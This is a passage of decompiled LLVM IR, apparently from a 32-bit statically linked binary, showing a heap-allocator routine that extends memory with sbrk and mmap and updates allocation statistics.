  %v1_804fcea = inttoptr i32 %v8_804fcc1 to i32*
  store i32 0, i32* %v1_804fcea, align 4
  br label %dec_label_pc_804fcf2

dec_label_pc_804fcf2:                             ; preds = %dec_label_pc_804fcd7, %dec_label_pc_804fcea
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804fcd7 ], [ @ebx, %dec_label_pc_804fcea ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804fcf2 = or i32 %storemerge, 2
  %v1_804fcf5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fcf5 = add i32 %v1_804fcf5, 4
  %v3_804fcf5 = inttoptr i32 %v2_804fcf5 to i32*
  store i32 %v1_804fcf2, i32* %v3_804fcf5, align 4
  %v0_804fcf8 = load i32, i32* @global_var_805b890.126, align 16
  %v1_804fcfd = add i32 %v0_804fcf8, 1
  store i32 %v1_804fcfd, i32* %eax.global-to-local, align 4
  store i32 %v1_804fcfd, i32* @global_var_805b890.126, align 16
  %v1_804fd03 = load i32, i32* @global_var_805b898.128, align 8
  %v7_804fd09 = icmp sgt i32 %v1_804fcfd, %v1_804fd03
  br i1 %v7_804fd09, label %dec_label_pc_804fd0b, label %dec_label_pc_804fd10

dec_label_pc_804fd0b:                             ; preds = %dec_label_pc_804fcf2
  store i32 %v1_804fcfd, i32* @global_var_805b898.128, align 8
  br label %dec_label_pc_804fd10

dec_label_pc_804fd10:                             ; preds = %dec_label_pc_804fcf2, %dec_label_pc_804fd0b
  %v0_804fd10 = load i32, i32* @global_var_805b8a4.129, align 4
  %v1_804fd15 = load i32, i32* @ebx, align 4
  %v2_804fd15 = add i32 %v1_804fd15, %v0_804fd10
  store i32 %v2_804fd15, i32* %eax.global-to-local, align 4
  store i32 %v2_804fd15, i32* @global_var_805b8a4.129, align 4
  %v1_804fd1c = load i32, i32* @global_var_805b8b0.130, align 16
  %tmp130 = icmp ugt i32 %v2_804fd15, %v1_804fd1c
  br i1 %tmp130, label %dec_label_pc_804fd24, label %dec_label_pc_804fd29

dec_label_pc_804fd24:                             ; preds = %dec_label_pc_804fd10
  store i32 %v2_804fd15, i32* @global_var_805b8b0.130, align 16
  br label %dec_label_pc_804fd29

dec_label_pc_804fd29:                             ; preds = %dec_label_pc_804fd10, %dec_label_pc_804fd24
  %v1_804fd29 = load i32, i32* @global_var_805b8a8.131, align 8
  %v2_804fd29 = add i32 %v1_804fd29, %v2_804fd15
  store i32 %v2_804fd29, i32* %eax.global-to-local, align 4
  %v1_804fd2f = load i32, i32* @global_var_805b8b4.132, align 4
  %tmp131 = icmp ugt i32 %v2_804fd29, %v1_804fd2f
  br i1 %tmp131, label %dec_label_pc_804fd3b, label %dec_label_pc_804f98c

dec_label_pc_804fd3b:                             ; preds = %dec_label_pc_804fd29
  store i32 %v2_804fd29, i32* @global_var_805b8b4.132, align 4
  br label %dec_label_pc_804f98c

dec_label_pc_804fd45:                             ; preds = %dec_label_pc_804fca0, %dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge, %dec_label_pc_804fc8f, %dec_label_pc_804fc78
  %v0_804fd45 = phi i32 [ %v0_804fd45.pre, %dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge ], [ %v0_804fc0d, %dec_label_pc_804fc8f ], [ %v0_804fc0d, %dec_label_pc_804fca0 ], [ %v0_804fc0d, %dec_label_pc_804fc78 ]
  store i32 %v0_804fd45, i32* %eax.global-to-local, align 4
  %v1_804fd4e = add i32 %v0_804fd45, 4
  %v2_804fd4e = inttoptr i32 %v1_804fd4e to i32*
  %v3_804fd4e = load i32, i32* %v2_804fd4e, align 4
  %v1_804fd58 = and i32 %v3_804fd4e, -4
  %v2_804fd58 = icmp eq i32 %v1_804fd58, 0
  store i32 %v1_804fd58, i32* @ebp, align 4
  %v1_804fd5b = load i32, i32* @global_var_805b888.133, align 8
  %v2_804fd5b = add i32 %v1_804fd5b, %v1_804fc17
  store i32 %v2_804fd5b, i32* %eax.global-to-local, align 4
  %v0_804fd61 = load i8, i8* @global_var_805b8a0.134, align 32
  %v1_804fd61 = urem i8 %v0_804fd61, 2
  %v2_804fd61 = icmp eq i8 %v1_804fd61, 0
  br i1 %v2_804fd61, label %dec_label_pc_804fd6c, label %dec_label_pc_804fd6a

dec_label_pc_804fd6a:                             ; preds = %dec_label_pc_804fd45
  %v2_804fd6a = sub i32 %v2_804fd5b, %v1_804fd58
  store i32 %v2_804fd6a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fd6c

dec_label_pc_804fd6c:                             ; preds = %dec_label_pc_804fd45, %dec_label_pc_804fd6a
  %v0_804fd70 = phi i32 [ %v2_804fd5b, %dec_label_pc_804fd45 ], [ %v2_804fd6a, %dec_label_pc_804fd6a ]
  %v5_804fd70 = add i32 %v0_804fd70, %v1_804fc78
  store i32 %v5_804fd70, i32* %eax.global-to-local, align 4
  %v1_804fd74 = sub i32 0, %v0_804fc44
  store i32 %v1_804fd74, i32* %edx.global-to-local, align 4
  %v2_804fd7c = and i32 %v5_804fd70, %v1_804fd74
  store i32 %v2_804fd7c, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_804fd7c, 1
  br i1 %tmp88, label %dec_label_pc_804fd96, label %dec_label_pc_804fd80

dec_label_pc_804fd80:                             ; preds = %dec_label_pc_804fd6c
  store i32 %v2_804fd7c, i32* %stack_var_-92, align 4
  %v1_804fd84 = call i32 @__GI_sbrk(i32 %v2_804fd7c)
  store i32 %v1_804fd84, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  store i32 %v1_804fd84, i32* @ebx, align 4
  %v10_804fd91 = icmp eq i32 %v1_804fd84, -1
  %v1_804fd94 = icmp eq i1 %v10_804fd91, false
  br i1 %v1_804fd94, label %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge, label %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge

dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge: ; preds = %dec_label_pc_804fd80
  %v0_804fd96.pre = load i8, i8* @global_var_805b8a0.134, align 32
  br label %dec_label_pc_804fd96

dec_label_pc_804fd96:                             ; preds = %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge, %dec_label_pc_804fd6c
  %v0_804fdc2 = phi i32 [ -1, %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge ], [ %v1_804fd74, %dec_label_pc_804fd6c ]
  %v0_804fd96 = phi i8 [ %v0_804fd96.pre, %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge ], [ %v0_804fd61, %dec_label_pc_804fd6c ]
  %v1_804fd96 = urem i8 %v0_804fd96, 2
  %v2_804fd96 = icmp eq i8 %v1_804fd96, 0
  br i1 %v2_804fd96, label %dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge, label %dec_label_pc_804fd9f

dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge: ; preds = %dec_label_pc_804fd96
  %v0_804fdab.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fdab

dec_label_pc_804fd9f:                             ; preds = %dec_label_pc_804fd96
  %v2_804fda3 = add i32 %v1_804fd58, %v1_804fc78
  store i32 %v2_804fda3, i32* %eax.global-to-local, align 4
  %v0_804fda5 = load i32, i32* @esi, align 4
  %v2_804fda5 = add i32 %v0_804fda5, %v2_804fda3
  %v5_804fda7 = and i32 %v2_804fda5, %v1_804fd74
  store i32 %v5_804fda7, i32* @esi, align 4
  br label %dec_label_pc_804fdab

dec_label_pc_804fdab:                             ; preds = %dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge, %dec_label_pc_804fd9f
  %v0_804fdab = phi i32 [ %v0_804fdab.pre, %dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge ], [ %v5_804fda7, %dec_label_pc_804fd9f ]
  %tmp132 = icmp ult i32 %v0_804fdab, 1048576
  br i1 %tmp132, label %dec_label_pc_804fdb3, label %dec_label_pc_804fdb8

dec_label_pc_804fdb3:                             ; preds = %dec_label_pc_804fdab
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_804fdb8

dec_label_pc_804fdb8:                             ; preds = %dec_label_pc_804fdab, %dec_label_pc_804fdb3
  %v0_804fdcc = phi i32 [ %v0_804fdab, %dec_label_pc_804fdab ], [ 1048576, %dec_label_pc_804fdb3 ]
  %tmp133 = icmp ugt i32 %v0_804fdcc, %v1_804fca2
  br i1 %tmp133, label %dec_label_pc_804fdc2, label %dec_label_pc_804fffa

dec_label_pc_804fdc2:                             ; preds = %dec_label_pc_804fdb8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804fdcf = call i32 @mmap(i32 0, i32 %v0_804fdcc, i32 3, i32 34, i32 0, i32 0, i32 %v0_804fdc2, i32 %v0_804fdc2)
  store i32 %v8_804fdcf, i32* %eax.global-to-local, align 4
  store i32 %v8_804fdcf, i32* @ebx, align 4
  %v10_804fdd9 = icmp eq i32 %v8_804fdcf, -1
  br i1 %v10_804fdd9, label %dec_label_pc_804fffa, label %dec_label_pc_804fdec.thread

dec_label_pc_804fdec.thread:                      ; preds = %dec_label_pc_804fdc2
  %v0_804fde2 = load i8, i8* @global_var_805b8a0.134, align 1
  %v2_804fde2 = and i8 %v0_804fde2, -2
  store i8 %v2_804fde2, i8* @global_var_805b8a0.134, align 32
  %v1_804fde9 = load i32, i32* @esi, align 4
  %v2_804fde9 = add i32 %v1_804fde9, %v8_804fdcf
  store i32 %v2_804fde9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fdf5

dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge: ; preds = %dec_label_pc_804fd80
  %v1_804fdf9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fdf5

dec_label_pc_804fdf5:                             ; preds = %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge, %dec_label_pc_804fdec.thread
  %v1_804fdf9 = phi i32 [ %v1_804fde9, %dec_label_pc_804fdec.thread ], [ %v1_804fdf9.pre, %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge ]
  %v0_804fec192 = phi i32 [ %v8_804fdcf, %dec_label_pc_804fdec.thread ], [ %v1_804fd84, %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge ]
  %v0_804feb391 = phi i32 [ %v2_804fde9, %dec_label_pc_804fdec.thread ], [ -1, %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge ]
  %v0_804fdf9 = load i32, i32* @global_var_805b8a8.131, align 8
  %v2_804fdf9 = add i32 %v1_804fdf9, %v0_804fdf9
  store i32 %v2_804fdf9, i32* @global_var_805b8a8.131, align 8
  %v2_804fdff = add i32 %v1_804fd58, %v0_804fd45
  store i32 %v2_804fdff, i32* %ecx.global-to-local, align 4
  %v2_804fe01 = sub i32 %v0_804fec192, %v2_804fdff
  %v7_804fe01 = icmp ult i32 %v0_804fec192, %v2_804fdff
  %v12_804fe01 = icmp eq i32 %v2_804fe01, 0
  %v1_804fe03 = icmp eq i1 %v12_804fe01, false
  br i1 %v1_804fe03, label %dec_label_pc_804fe1c, label %dec_label_pc_804fe05

dec_label_pc_804fe05:                             ; preds = %dec_label_pc_804fdf5
  %v10_804fe05 = icmp eq i32 %v0_804feb391, -1
  %v1_804fe08 = icmp eq i1 %v10_804fe05, false
  br i1 %v1_804fe08, label %dec_label_pc_804fe1c, label %dec_label_pc_804fe0a

dec_label_pc_804fe0a:                             ; preds = %dec_label_pc_804fe05
  %v2_804fe0a = add i32 %v1_804fdf9, %v1_804fd58
  store i32 %v0_804fd45, i32* %ecx.global-to-local, align 4
  %v1_804fe11 = or i32 %v2_804fe0a, 1
  store i32 %v1_804fe11, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe11, i32* %v2_804fd4e, align 4
  br label %dec_label_pc_804ff49

dec_label_pc_804fe1c:                             ; preds = %dec_label_pc_804fe05, %dec_label_pc_804fdf5
  %v0_804fe1c = load i8, i8* @global_var_805b8a0.134, align 1
  %v1_804fe1c = sext i8 %v0_804fe1c to i32
  store i32 %v1_804fe1c, i32* %eax.global-to-local, align 4
  %v2_804fe21 = urem i8 %v0_804fe1c, 2
  %v3_804fe21 = icmp eq i8 %v2_804fe21, 0
  br i1 %v3_804fe21, label %dec_label_pc_804fe35, label %dec_label_pc_804fe25

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fe1c
  br i1 %v2_804fd58, label %dec_label_pc_804fe35, label %dec_label_pc_804fe29

dec_label_pc_804fe29:                             ; preds = %dec_label_pc_804fe25
  %v1_804fe2b = icmp eq i1 %v7_804fe01, false
  br i1 %v1_804fe2b, label %dec_label_pc_804fe35, label %dec_label_pc_804fe2d

dec_label_pc_804fe2d:                             ; preds = %dec_label_pc_804fe29
  %v1_804fe2d = and i32 %v1_804fe1c, -2
  %v4_804fe2d = trunc i32 %v1_804fe2d to i8
  store i32 %v1_804fe2d, i32* %eax.global-to-local, align 4
  store i8 %v4_804fe2d, i8* @global_var_805b8a0.134, align 32
  br label %dec_label_pc_804fe35

dec_label_pc_804fe35:                             ; preds = %dec_label_pc_804fe29, %dec_label_pc_804fe25, %dec_label_pc_804fe1c, %dec_label_pc_804fe2d
  %v0_804fe35 = phi i8 [ %v0_804fe1c, %dec_label_pc_804fe29 ], [ %v0_804fe1c, %dec_label_pc_804fe25 ], [ %v0_804fe1c, %dec_label_pc_804fe1c ], [ %v4_804fe2d, %dec_label_pc_804fe2d ]
  %v1_804fe35 = urem i8 %v0_804fe35, 2
  %v2_804fe35 = icmp eq i8 %v1_804fe35, 0
  br i1 %v2_804fe35, label %dec_label_pc_804feb3, label %dec_label_pc_804fe3e

dec_label_pc_804fe3e:                             ; preds = %dec_label_pc_804fe35
  br i1 %v2_804fd58, label %dec_label_pc_804fe4c, label %dec_label_pc_804fe42

dec_label_pc_804fe42:                             ; preds = %dec_label_pc_804fe3e
  store i32 %v2_804fe01, i32* %eax.global-to-local, align 4
  %v2_804fe46 = add i32 %v2_804fdf9, %v2_804fe01
  store i32 %v2_804fe46, i32* @global_var_805b8a8.131, align 8
  br label %dec_label_pc_804fe4c

dec_label_pc_804fe4c:                             ; preds = %dec_label_pc_804fe3e, %dec_label_pc_804fe42
  %v1_804fe4e = urem i32 %v0_804fec192, 8
  %v2_804fe4e = icmp eq i32 %v1_804fe4e, 0
  store i32 %v1_804fe4e, i32* %edx.global-to-local, align 4
  %v1_804fe51 = icmp eq i1 %v2_804fe4e, false
  br i1 %v1_804fe51, label %dec_label_pc_804fe59, label %dec_label_pc_804fe53

dec_label_pc_804fe53:                             ; preds = %dec_label_pc_804fe4c
  store i32 %v0_804fec192, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe63

dec_label_pc_804fe59:                             ; preds = %dec_label_pc_804fe4c
  %v2_804fe5e = sub nsw i32 8, %v1_804fe4e
  store i32 %v2_804fe5e, i32* %eax.global-to-local, align 4
  %v2_804fe60 = add i32 %v2_804fe5e, %v0_804fec192
  store i32 %v2_804fe60, i32* @edi, align 4
  br label %dec_label_pc_804fe63

dec_label_pc_804fe63:                             ; preds = %dec_label_pc_804fe53, %dec_label_pc_804fe59
  %v0_804fe66 = phi i32 [ 0, %dec_label_pc_804fe53 ], [ %v2_804fe5e, %dec_label_pc_804fe59 ]
  %v2_804fe63 = add i32 %v1_804fdf9, %v0_804fec192
  %v2_804fe66 = add i32 %v0_804fe66, %v1_804fd58
  store i32 %v2_804fe66, i32* %ecx.global-to-local, align 4
  %v2_804fe6f = add i32 %v2_804fe66, %v2_804fe63
  store i32 %v2_804fe6f, i32* %edx.global-to-local, align 4
  %v2_804fe75 = add i32 %v2_804fe6f, %v1_804fc78
  %v5_804fe78 = and i32 %v2_804fe75, %v1_804fd74
  %v2_804fe7f = sub i32 %v5_804fe78, %v2_804fe6f
  store i32 %v2_804fe7f, i32* %eax.global-to-local, align 4
  %v2_804fe81 = add i32 %v2_804fe7f, %v2_804fe66
  store i32 %v2_804fe81, i32* @esi, align 4
  store i32 %v2_804fe81, i32* %stack_var_-92, align 4
  %v1_804fe85 = call i32 @__GI_sbrk(i32 %v2_804fe81)
  store i32 %v1_804fe85, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe85, i32* %edx.global-to-local, align 4
  %v10_804fe8f = icmp eq i32 %v1_804fe85, -1
  %v1_804fe92 = icmp eq i1 %v10_804fe8f, false
  br i1 %v1_804fe92, label %dec_label_pc_804fea2, label %dec_label_pc_804fe94

dec_label_pc_804fe94:                             ; preds = %dec_label_pc_804fe63
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804fe99 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804fe99, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe99, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fed6

dec_label_pc_804fea2:                             ; preds = %dec_label_pc_804fe63
  %v1_804fea2 = load i32, i32* @ebx, align 4
  %v7_804fea2 = icmp ult i32 %v1_804fe85, %v1_804fea2
  %v1_804fea4 = icmp eq i1 %v7_804fea2, false
  br i1 %v1_804fea4, label %dec_label_pc_804fedb, label %dec_label_pc_804fea6

dec_label_pc_804fea6:                             ; preds = %dec_label_pc_804fea2
  %v0_804fea6 = load i8, i8* @global_var_805b8a0.134, align 1
  %v2_804fea6 = and i8 %v0_804fea6, -2
  store i8 %v2_804fea6, i8* @global_var_805b8a0.134, align 32
  store i32 %v2_804fe63, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804feba

dec_label_pc_804feb3:                             ; preds = %dec_label_pc_804fe35
  %v10_804feb3 = icmp eq i32 %v0_804feb391, -1
  br i1 %v10_804feb3, label %dec_label_pc_804febe, label %dec_label_pc_804feb8

dec_label_pc_804feb8:                             ; preds = %dec_label_pc_804feb3
  store i32 %v0_804fec192, i32* @edi, align 4
  br label %dec_label_pc_804feba

dec_label_pc_804feba:                             ; preds = %dec_label_pc_804fea6, %dec_label_pc_804feb8
  %v0_804fedb49 = phi i32 [ %v2_804fe63, %dec_label_pc_804fea6 ], [ %v0_804feb391, %dec_label_pc_804feb8 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804fedb

dec_label_pc_804febe:                             ; preds = %dec_label_pc_804feb3
  store i32 %v0_804fec192, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804fec5 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804fec5, i32* %edx.global-to-local, align 4
  %v1_804fecc = load i32, i32* @ebx, align 4
  %v2_804fecc = sub i32 %v1_804fec5, %v1_804fecc
  %v1_804fece = load i32, i32* @esi, align 4
  %v2_804fece = sub i32 %v2_804fecc, %v1_804fece
  store i32 %v2_804fece, i32* %eax.global-to-local, align 4
  %v0_804fed0 = load i32, i32* @global_var_805b8a8.131, align 8
  %v2_804fed0 = add i32 %v0_804fed0, %v2_804fece
  store i32 %v2_804fed0, i32* @global_var_805b8a8.131, align 8
  br label %dec_label_pc_804fed6

dec_label_pc_804fed6:                             ; preds = %dec_label_pc_804fe94, %dec_label_pc_804febe
  %v0_804fedb48 = phi i32 [ %v1_804fe99, %dec_label_pc_804fe94 ], [ %v1_804fec5, %dec_label_pc_804febe ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804fedb

dec_label_pc_804fedb:                             ; preds = %dec_label_pc_804fea2, %dec_label_pc_804feba, %dec_label_pc_804fed6
  %v0_804fee0 = phi i32 [ %v1_804fe85, %dec_label_pc_804fea2 ], [ %v0_804fedb49, %dec_label_pc_804feba ], [ %v0_804fedb48, %dec_label_pc_804fed6 ]
  %v10_804fedb = icmp eq i32 %v0_804fee0, -1
  br i1 %v10_804fedb, label %dec_label_pc_804ff49, label %dec_label_pc_804fee0

dec_label_pc_804fee0:                             ; preds = %dec_label_pc_804fedb
  %v1_804fee0 = load i32, i32* @edi, align 4
  %v2_804fee0 = sub i32 %v0_804fee0, %v1_804fee0
  store i32 %v2_804fee0, i32* %edx.global-to-local, align 4
  store i32 %v1_804fee0, i32* @global_var_805b56c.119, align 4
  %v1_804fee8 = load i32, i32* @esi, align 4
  %v2_804fee8 = add i32 %v1_804fee8, %v2_804fee0
  %v1_804feeb = or i32 %v2_804fee8, 1
  store i32 %v1_804feeb, i32* %eax.global-to-local, align 4
  %v2_804feee = add i32 %v1_804fee0, 4
  %v3_804feee = inttoptr i32 %v2_804feee to i32*
  store i32 %v1_804feeb, i32* %v3_804feee, align 4
  %v0_804fef1 = load i32, i32* @global_var_805b8a8.131, align 8
  %v1_804fef1 = load i32, i32* @esi, align 4
  %v2_804fef1 = add i32 %v1_804fef1, %v0_804fef1
  store i32 %v2_804fef1, i32* @global_var_805b8a8.131, align 8
  br i1 %v2_804fd58, label %dec_label_pc_804ff49, label %dec_label_pc_804fefb

dec_label_pc_804fefb:                             ; preds = %dec_label_pc_804fee0
  %v1_804fefb = add i32 %v1_804fd58, -12
  store i32 %v0_804fd45, i32* %ecx.global-to-local, align 4
  %v1_804ff02 = and i32 %v1_804fefb, -8
  store i32 %v1_804ff02, i32* %eax.global-to-local, align 4
  %v1_804ff07 = or i32 %v1_804ff02, 1
  store i32 %v1_804ff07, i32* %edx.global-to-local, align 4
  %v5_804ff0a = icmp ult i32 %v1_804ff02, 15
  store i32 %v1_804ff07, i32* %v2_804fd4e, align 4
  %v0_804ff10 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ff10 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff10 = add i32 %v0_804ff10, 4
  %v3_804ff10 = add i32 %v2_804ff10, %v1_804ff10
  %v4_804ff10 = inttoptr i32 %v3_804ff10 to i32*
  store i32 5, i32* %v4_804ff10, align 4
  %v0_804ff18 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ff18 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff18 = add i32 %v0_804ff18, 8
  %v3_804ff18 = add i32 %v2_804ff18, %v1_804ff18
  %v4_804ff18 = inttoptr i32 %v3_804ff18 to i32*
  store i32 5, i32* %v4_804ff18, align 4
  br i1 %v5_804ff0a, label %dec_label_pc_804ff49, label %dec_label_pc_804ff22

dec_label_pc_804ff22:                             ; preds = %dec_label_pc_804fefb
  %v0_804ff25 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ff27 = add i32 %v0_804ff25, 8
  store i32 %v1_804ff27, i32* %eax.global-to-local, align 4
  %v0_804ff2a = load i32, i32* @global_var_805b884.135, align 4
  store i32 %v0_804ff2a, i32* @ebx, align 4
  store i32 %v1_804ff27, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_805b884.135, align 4
  %v1_804ff3b = call i32 @free(i32 %v1_804ff27)
  store i32 %v1_804ff3b, i32* %eax.global-to-local, align 4
  %v0_804ff40 = load i32, i32* @ebx, align 4
  store i32 %v0_804ff40, i32* @global_var_805b884.135, align 4
  br label %dec_label_pc_804ff49

dec_label_pc_804ff49:                             ; preds = %dec_label_pc_804fefb, %dec_label_pc_804fee0, %dec_label_pc_804fedb, %dec_label_pc_804fe0a, %dec_label_pc_804ff22
  %v0_804ff49 = load i32, i32* @global_var_805b8a8.131, align 8
  store i32 %v0_804ff49, i32* %eax.global-to-local, align 4
  %v1_804ff4e = load i32, i32* @global_var_805b8ac.136, align 4
  %tmp134 = icmp ugt i32 %v0_804ff49, %v1_804ff4e
  br i1 %tmp134, label %dec_label_pc_804ff56, label %dec_label_pc_804ff5b

dec_label_pc_804ff56:                             ; preds = %dec_label_pc_804ff49
  store i32 %v0_804ff49, i32* @global_var_805b8ac.136, align 4
  br label %dec_label_pc_804ff5b

dec_label_pc_804ff5b:                             ; preds = %dec_label_pc_804ff49, %dec_label_pc_804ff56
  %v1_804ff5b = load i32, i32* @global_var_805b8a4.129, align 4
  %v2_804ff5b = add i32 %v1_804ff5b, %v0_804ff49
  store i32 %v2_804ff5b, i32* %eax.global-to-local, align 4
  %v1_804ff61 = load i32, i32* @global_var_805b8b4.132, align 4
  %tmp135 = icmp ugt i32 %v2_804ff5b, %v1_804ff61
  br i1 %tmp135, label %dec_label_pc_804ff69, label %dec_label_pc_804ff6e

dec_label_pc_804ff69:                             ; preds = %dec_label_pc_804ff5b
  store i32 %v2_804ff5b, i32* @global_var_805b8b4.132, align 4
  br label %dec_label_pc_804ff6e

dec_label_pc_804ff6e:                             ; preds = %dec_label_pc_804ff5b, %dec_label_pc_804ff69
  %v0_804ff6e = load i32, i32* @global_var_805b56c.119, align 4
  store i32 %v0_804ff6e, i32* @ebx, align 4
  %v1_804ff74 = add i32 %v0_804ff6e, 4
  %v2_804ff74 = inttoptr i32 %v1_804ff74 to i32*
  %v3_804ff74 = load i32, i32* %v2_804ff74, align 4
  %v1_804ff77 = and i32 %v3_804ff74, -4
  store i32 %v1_804ff77, i32* %ecx.global-to-local, align 4
  %v10_804ff7a = icmp ult i32 %v1_804ff77, %v1_804fc17
  br i1 %v10_804ff7a, label %dec_label_pc_804fffa, label %dec_label_pc_804ff80

dec_label_pc_804ff80:                             ; preds = %dec_label_pc_804ff6e
  store i32 %v1_804fca2, i32* %esi.global-to-local, align 4
  %v2_804ff86 = sub i32 %v1_804ff77, %v1_804fca2
  store i32 %v2_804ff86, i32* %ecx.global-to-local, align 4
  %v2_804ff88 = add i32 %v0_804ff6e, %v1_804fca2
  store i32 %v2_804ff88, i32* %edx.global-to-local, align 4
  %v1_804ff8b = or i32 %v1_804fca2, 1
  store i32 %v1_804ff8b, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff88, i32* @global_var_805b56c.119, align 4
  store i32 %v1_804ff8b, i32* %v2_804ff74, align 4
  %v0_804ff97.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ff97

dec_label_pc_804ff97:                             ; preds = %dec_label_pc_804fc28, %dec_label_pc_804ff80
  %v0_804ff97 = phi i32 [ %v5_804fc3b, %dec_label_pc_804fc28 ], [ %v0_804ff97.pre, %dec_label_pc_804ff80 ]
  %v1_804ff97 = or i32 %v0_804ff97, 1
  store i32 %v1_804ff97, i32* %ecx.global-to-local, align 4
  %v0_804ff9a = load i32, i32* @ebx, align 4
  %v1_804ff9a = add i32 %v0_804ff9a, 8
  store i32 %v1_804ff9a, i32* %ebx.global-to-local, align 4
  %v1_804ff9d = load i32, i32* %edx.global-to-local, align 4
  %v2_804ff9d = add i32 %v1_804ff9d, 4
  %v3_804ff9d = inttoptr i32 %v2_804ff9d to i32*
  store i32 %v1_804ff97, i32* %v3_804ff9d, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804ffa2:                             ; preds = %dec_label_pc_804f9e2
  %v5_804ffa8 = sub i32 %v1_804f9c5, %v1_804fca2
  store i32 %v5_804ffa8, i32* %eax.global-to-local, align 4
  %v2_804ffac = add i32 %v0_804fa90111, %v1_804fca2
  store i32 %v2_804ffac, i32* %edx.global-to-local, align 4
  %v1_804ffb0 = or i32 %v1_804fca2, 1
  store i32 %v2_804ffac, i32* @global_var_805b570.120, align 16
  store i32 %v1_804ffb0, i32* %v2_804f9bf, align 4
  %v0_804ffbc = load i32, i32* %eax.global-to-local, align 4
  %v0_804ffbe = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804ffbe, i32* @global_var_805b57c.137, align 4
  %v1_804ffc4 = or i32 %v0_804ffbc, 1
  store i32 %v1_804ffc4, i32* %ecx.global-to-local, align 4
  store i32 %v0_804ffbe, i32* @global_var_805b580.122, align 128
  %v1_804ffcd = add i32 %v0_804ffbe, 8
  %v2_804ffcd = inttoptr i32 %v1_804ffcd to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v2_804ffcd, align 4
  %v0_804ffd4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd4 = add i32 %v0_804ffd4, 12
  %v2_804ffd4 = inttoptr i32 %v1_804ffd4 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v2_804ffd4, align 4
  %v0_804ffdb = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ffdb = load i32, i32* %edx.global-to-local, align 4
  %v2_804ffdb = add i32 %v1_804ffdb, 4
  %v3_804ffdb = inttoptr i32 %v2_804ffdb to i32*
  store i32 %v0_804ffdb, i32* %v3_804ffdb, align 4
  %v0_804ffde = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffde = load i32, i32* %edx.global-to-local, align 4
  %v3_804ffde = add i32 %v1_804ffde, %v0_804ffde
  %v4_804ffde = inttoptr i32 %v3_804ffde to i32*
  store i32 %v0_804ffde, i32* %v4_804ffde, align 4
  br label %dec_label_pc_804ffec

dec_label_pc_804ffe3:                             ; preds = %dec_label_pc_804f9f1
  store i32 %v1_804fca2, i32* %ebx.global-to-local, align 4
  %v0_804ffe7 = load i32, i32* @ebp, align 4
  %v2_804ffe7 = or i32 %v1_804fca2, 4
  %v3_804ffe7 = add i32 %v0_804ffe7, %v2_804ffe7
  %v4_804ffe7 = inttoptr i32 %v3_804ffe7 to i32*
  %v5_804ffe7 = load i32, i32* %v4_804ffe7, align 4
  %v6_804ffe7 = or i32 %v5_804ffe7, 1
  store i32 %v6_804ffe7, i32* %v4_804ffe7, align 4
  br label %dec_label_pc_804ffec

dec_label_pc_804ffec:                             ; preds = %dec_label_pc_804ffa2, %dec_label_pc_804ffe3
  %v0_804ffec = load i32, i32* @ebp, align 4
  %v1_804ffec = add i32 %v0_804ffec, 8
  store i32 %v1_804ffec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fff1:                             ; preds = %dec_label_pc_804fae1
  %v1_804fff1 = load i32, i32* @ebx, align 4
  %v2_804fff1 = add i32 %v0_804faf0, 4
  %v3_804fff1 = add i32 %v2_804fff1, %v1_804fff1
